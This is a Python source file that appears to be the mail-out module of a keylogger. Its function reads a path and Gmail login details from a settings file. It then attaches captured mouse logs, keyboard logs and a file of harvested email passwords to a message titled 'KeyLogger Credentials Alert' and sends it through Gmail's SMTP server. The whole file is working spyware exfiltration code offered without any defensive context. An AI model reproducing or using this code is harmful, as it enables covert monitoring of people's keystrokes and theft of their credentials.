import smtplib
import mimetypes
from email.message import EmailMessage
from os.path import join


def sendmail(current_time):
    message = EmailMessage()

    with open('setting.txt') as f:
        lines = f.readlines()
        path = lines[1].replace("\n", "")
        sender = lines[3].replace("\n", "")
        password = lines[4].replace("\n", "")
        isMouseActive = lines[5].replace("\n", "")
        isKeyboardActive = lines[6].replace("\n", "")
        isPasswordActive = lines[10].replace("\n", "")

    recipient = sender

    message['From'] = sender
    message['To'] = recipient
    message['Subject'] = 'KeyLogger Credentials Alert'

    name = current_time + 'Mouse.txt'
    mime_type, _ = mimetypes.guess_type(name)
    mime_type, mime_subtype = mime_type.split('/')

    if isMouseActive == '1':
        with open(join(path, name), 'rb') as file:
            message.add_attachment(file.read(),
                                   maintype=mime_type,
                                   subtype=mime_subtype,
                                   filename='Mouse Log')

    if isKeyboardActive == '1':
        with open(join(path, current_time + 'Keyboard.txt'), 'rb') as file:
            message.add_attachment(file.read(),
                                   maintype=mime_type,
                                   subtype=mime_subtype,
                                   filename='Keyboard Log')
    if isPasswordActive == '1':
        with open(join(path, "emailPassword.txt"), 'rb') as file:
            message.add_attachment(file.read(),
                                   maintype=mime_type,
                                   subtype=mime_subtype,
                                   filename='Email Log')

    mail_server = smtplib.SMTP_SSL('smtp.gmail.com')
    mail_server.set_debuglevel(1)
    mail_server.login(sender, password)
    mail_server.send_message(message)
    mail_server.quit()
